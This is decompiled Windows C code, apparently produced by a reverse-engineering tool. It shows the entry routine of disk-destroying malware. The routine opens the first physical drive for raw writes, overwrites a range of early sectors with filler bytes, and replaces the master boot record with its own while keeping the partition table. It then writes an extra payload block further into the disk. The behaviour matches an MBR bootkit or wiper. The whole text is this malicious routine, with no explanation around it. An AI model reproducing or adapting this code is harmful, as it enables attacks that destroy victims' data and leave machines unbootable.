
undefined4 entry(void)

{
  HANDLE pvVar1;
  LPCSTR lpText;
  DWORD DVar2;
  int iVar3;
  undefined4 *puVar4;
  char *lpCaption;
  UINT uType;
  undefined4 local_20c [111];
  undefined local_4e [66];
  DWORD local_c;
  DWORD local_8;
  
  DAT_10005438 = CreateFileW(L"\\\\.\\PhysicalDrive0",0x10000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                             (HANDLE)0x0);
  if (DAT_10005438 == (HANDLE)0xffffffff) {
    uType = 0;
    lpCaption = "Fatal Error - CF";
    lpText = (LPCSTR)GetLastError();
    MessageBoxA((HWND)0x0,lpText,lpCaption,uType);
  }
  FUN_10006000();
  puVar4 = local_20c;
  for (iVar3 = 0x80; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = 0x37373737;
    puVar4 = puVar4 + 1;
  }
  iVar3 = 0x200;
  do {
    pvVar1 = DAT_10005438;
    DVar2 = SetFilePointer(DAT_10005438,iVar3,(PLONG)0x0,0);
    if (DVar2 != 0xffffffff) {
      WriteFile(pvVar1,local_20c,0x200,&local_c,(LPOVERLAPPED)0x0);
    }
    pvVar1 = DAT_10005438;
    iVar3 = iVar3 + 0x200;
  } while (iVar3 < 0x4200);
  DVar2 = SetFilePointer(DAT_10005438,0x6e00,(PLONG)0x0,0);
  if (DVar2 != 0xffffffff) {
    WriteFile(pvVar1,local_20c,0x200,&local_8,(LPOVERLAPPED)0x0);
  }
  FUN_10006150();
  pvVar1 = DAT_10005438;
  DVar2 = SetFilePointer(DAT_10005438,0,(PLONG)0x0,0);
  if (DVar2 != 0xffffffff) {
    ReadFile(pvVar1,local_20c,0x200,&local_8,(LPOVERLAPPED)0x0);
  }
  memcpy(&DAT_100031be,local_4e,0x42);
  pvVar1 = DAT_10005438;
  DVar2 = SetFilePointer(DAT_10005438,0,(PLONG)0x0,0);
  if (DVar2 != 0xffffffff) {
    WriteFile(pvVar1,&DAT_10003000,0x200,&local_c,(LPOVERLAPPED)0x0);
  }
  pvVar1 = DAT_10005438;
  DVar2 = SetFilePointer(DAT_10005438,0x4400,(PLONG)0x0,0);
  if (DVar2 != 0xffffffff) {
    WriteFile(pvVar1,&DAT_10003200,0x2000,&local_8,(LPOVERLAPPED)0x0);
  }
  CloseHandle(DAT_10005438);
  return 0;
}

